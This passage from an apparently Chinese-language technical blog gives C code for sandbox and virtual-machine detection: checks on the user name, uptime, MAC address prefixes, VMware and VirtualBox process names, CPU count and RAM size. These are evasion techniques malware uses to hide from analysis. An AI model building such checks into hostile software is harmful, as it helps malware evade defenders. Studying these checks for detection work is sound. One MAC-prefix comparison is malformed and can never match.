class="string">&lt;Lmcons.h&gt;</span></span></span><br><span class="line"><span class="comment">// 检查当前用户是否名为 &quot;admin&quot;</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">checkAdminUser</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">wchar_t</span> userName[UNLEN + <span class="number">1</span>];</span><br><span class="line">    DWORD userNameSize = UNLEN + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前计算机用户名</span></span><br><span class="line">    <span class="keyword">if</span> (GetUserNameW(userName, &amp;userNameSize)) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Current User: %s\n&quot;</span>, userName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查用户名是否为&quot;admin&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (wcscmp(userName, <span class="string">L&quot;admin&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 用户名是 &quot;admin&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 用户名不是 &quot;admin&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Error getting user name. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 如果无法获取用户名，返回 false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkAdminUser()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The current user is not &#x27;admin&#x27;.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The current user is &#x27;admin&#x27;.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查开机时间"><a href="#检查开机时间" class="headerlink" title="检查开机时间"></a>检查开机时间</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查系统的开机时间是否少于10分钟</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">checkStartTime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取系统自启动以来的运行时间（毫秒）</span></span><br><span class="line">    ULONG uptime = GetTickCount();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查运行时间是否少于10分钟（10分钟 = 10 * 60秒 = 600秒 = 600,000毫秒）</span></span><br><span class="line">    <span class="keyword">if</span> (uptime &gt;= <span class="number">10</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 开机时间大于等于10分钟，返回 false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 开机时间少于10分钟，返回 true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 调用 checkStartTime 函数并根据返回值输出对应信息</span></span><br><span class="line">    <span class="keyword">if</span> (checkStartTime()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system has been up for less than 10 minutes.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system has been up for 10 minutes or more.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查MAC地址"><a href="#检查MAC地址" class="headerlink" title="检查MAC地址"></a>检查MAC地址</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用#pragma comment指令链接Netapi32.lib库</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Netapi32.lib&quot;</span>)</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义适配器状态结构和名称缓冲区结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ASTAT_</span> &#123;</span></span><br><span class="line">    ADAPTER_STATUS adapt;</span><br><span class="line">    NAME_BUFFER NameBuff[<span class="number">30</span>];</span><br><span class="line">&#125; ASTAT, * PASTAT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取MAC地址的前三个字节并存储为字符串</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_3part_mac</span><span class="params">(<span class="built_in">string</span>&amp; mac)</span> &#123;</span><br><span class="line">    NCB Ncb;</span><br><span class="line">    ASTAT Adapter;</span><br><span class="line">    UCHAR uRetCode;</span><br><span class="line">    LANA_ENUM lenum;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;Ncb, <span class="number">0</span>, <span class="keyword">sizeof</span>(Ncb));</span><br><span class="line">    Ncb.ncb_command = NCBENUM;</span><br><span class="line">    Ncb.ncb_buffer = (UCHAR*)&amp;lenum;</span><br><span class="line">    Ncb.ncb_length = <span class="keyword">sizeof</span>(lenum);</span><br><span class="line">    uRetCode = Netbios(&amp;Ncb);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uRetCode != NRC_GOODRET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Netbios枚举调用失败，错误代码: %d\n&quot;</span>, uRetCode);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lenum.length; i++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;Ncb, <span class="number">0</span>, <span class="keyword">sizeof</span>(Ncb));</span><br><span class="line">        Ncb.ncb_command = NCBRESET;</span><br><span class="line">        Ncb.ncb_lana_num = lenum.lana[i];</span><br><span class="line">        uRetCode = Netbios(&amp;Ncb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uRetCode != NRC_GOODRET) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Netbios重置调用失败，错误代码: %d\n&quot;</span>, uRetCode);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;Ncb, <span class="number">0</span>, <span class="keyword">sizeof</span>(Ncb));</span><br><span class="line">        Ncb.ncb_command = NCBASTAT;</span><br><span class="line">        Ncb.ncb_lana_num = lenum.lana[i];</span><br><span class="line">        strcpy_s((<span class="type">char</span>*)Ncb.ncb_callname, <span class="keyword">sizeof</span>(Ncb.ncb_callname), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">        Ncb.ncb_buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)&amp;Adapter;</span><br><span class="line">        Ncb.ncb_length = <span class="keyword">sizeof</span>(Adapter);</span><br><span class="line">        uRetCode = Netbios(&amp;Ncb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uRetCode == NRC_GOODRET) &#123;</span><br><span class="line">            <span class="type">char</span> tmp[<span class="number">128</span>];</span><br><span class="line">            sprintf_s(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;%02x-%02x-%02x&quot;</span>,</span><br><span class="line">                Adapter.adapt.adapter_address[<span class="number">0</span>],</span><br><span class="line">                Adapter.adapt.adapter_address[<span class="number">1</span>],</span><br><span class="line">                Adapter.adapt.adapter_address[<span class="number">2</span>]</span><br><span class="line">            );</span><br><span class="line">            mac = tmp;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Netbios状态调用失败，错误代码: %d\n&quot;</span>, uRetCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否在虚拟机环境中运行</span></span><br><span class="line">BOOL <span class="title function_">CheckMacAddress</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">string</span> mac;</span><br><span class="line">    get_3part_mac(mac);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mac == <span class="string">&quot;00-05-69&quot;</span> || mac == <span class="string">&quot;00-0c-29&quot;</span> || mac == <span class="string">&quot;00:1C:14&quot;</span> || mac == <span class="string">&quot;00-50-56&quot;</span> ||</span><br><span class="line">        mac == <span class="string">&quot;00-03-ff&quot;</span> || mac == <span class="string">&quot;08-00-27&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (CheckMacAddress()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;检测到虚拟机或安全工具环境。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未检测到虚拟机或安全工具环境。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查进程"><a href="#检查进程" class="headerlink" title="检查进程"></a>检查进程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查进程列表中是否存在特定进程</span></span><br><span class="line">BOOL <span class="title function_">CheckSpecificProcesses</span><span class="params">(WCHAR* procname)</span> &#123;</span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Error: Failed to create process snapshot: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    BOOL res = Process32First(hSnapshot, &amp;pe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (res) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!wcscmp(pe.szExeFile, procname)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found process %ls is running，PID: %u\n&quot;</span>, procname, pe.th32ProcessID);</span><br><span class="line">            CloseHandle(hSnapshot);</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        res = Process32Next(hSnapshot, &amp;pe);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapshot);</span><br><span class="line">    <span class="keyword">return</span> FALSE;  <span class="comment">// 未找到进程，返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个二维数组，包含需要检测和终止的进程名称。</span></span><br><span class="line">    WCHAR t[][<span class="number">18</span>] = &#123;</span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// vmware.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;,             <span class="comment">// Vmtoolsd.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;,     <span class="comment">// Vmwaretrat.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Vmwareuser.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// vboxservice.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;, <span class="comment">// vboxtray.exe</span></span><br><span class="line">        &#123; <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;, <span class="comment">// Vmacthlp.exe  </span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> numElements = <span class="keyword">sizeof</span>(t) / <span class="keyword">sizeof</span>(t[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numElements; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (CheckSpecificProcesses(t[i])) &#123;</span><br><span class="line">            <span class="comment">// 可以在这里添加找到了进程后的处理逻辑</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查CPU"><a href="#检查CPU" class="headerlink" title="检查CPU"></a>检查CPU</h4><p>可以使用<code>GetSystemInfo</code>进行CPU 检查。此函数返回⼀个<code>SYSTEM_INFO</code>结构，其中包含有关系统的信息，包括处理器数量.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CheckCPU</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化 SYSTEM_INFO 结构体，用于存储系统信息</span></span><br><span class="line">    SYSTEM_INFO SysInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// 调用 Windows API 获取系统信息并存储在 SysInfo 中</span></span><br><span class="line">    GetSystemInfo(&amp;SysInfo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印处理器核心数量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of processors: %u\n&quot;</span>, SysInfo.dwNumberOfProcessors);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查处理器核心数量是否小于 2</span></span><br><span class="line">    <span class="keyword">if</span> (SysInfo.dwNumberOfProcessors &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Warning: System is using less than 2 processors.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> TRUE; <span class="comment">// 可能是虚拟化环境，返回 TRUE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE; <span class="comment">// 处理器核心数量正常，返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统的处理器核心数量</span></span><br><span class="line">    <span class="keyword">if</span> (CheckCPU()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system is potentially running in a virtualized environment.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system is likely running on physical hardware.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查RAM"><a href="#检查RAM" class="headerlink" title="检查RAM"></a>检查RAM</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CheckRAM</span><span class="params">()</span> &#123;</span><br><span class="line">    MEMORYSTATUSEX MemStatus;</span><br><span class="line">    MemStatus.dwLength = <span class="keyword">sizeof</span>(MEMORYSTATUSEX);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 Windows API 函数 GlobalMemoryStatusEx 获取系统内存使用情况</span></span><br><span class="line">    <span class="keyword">if</span> (!GlobalMemoryStatusEx(&amp;MemStatus)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t[!] GlobalMemoryStatusEx Failed With Error: %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 获取内存信息失败，返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印总物理内存的大小</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Total Physical Memory: %llu bytes\n&quot;</span>, MemStatus.ullTotalPhys);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查总物理内存是否小于或等于 2GB</span></span><br><span class="line">    <span class="keyword">if</span> (MemStatus.ullTotalPhys &lt;= (<span class="number">2ULL</span> * <span class="number">1073741824ULL</span>)) &#123; <span class="comment">// 2 * 1024^3 = 2GB</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Warning: System has 2GB or less of RAM.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> TRUE; <span class="comment">// 可能是虚拟化环境，返回 TRUE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE; <span class="comment">// 内存大小正常，返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统的内存大小</span></span><br><span class="line">    <span class="keyword">if</span> (CheckRAM()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system is potentially running in a virtualized environment.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system likely has sufficient physical RAM.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

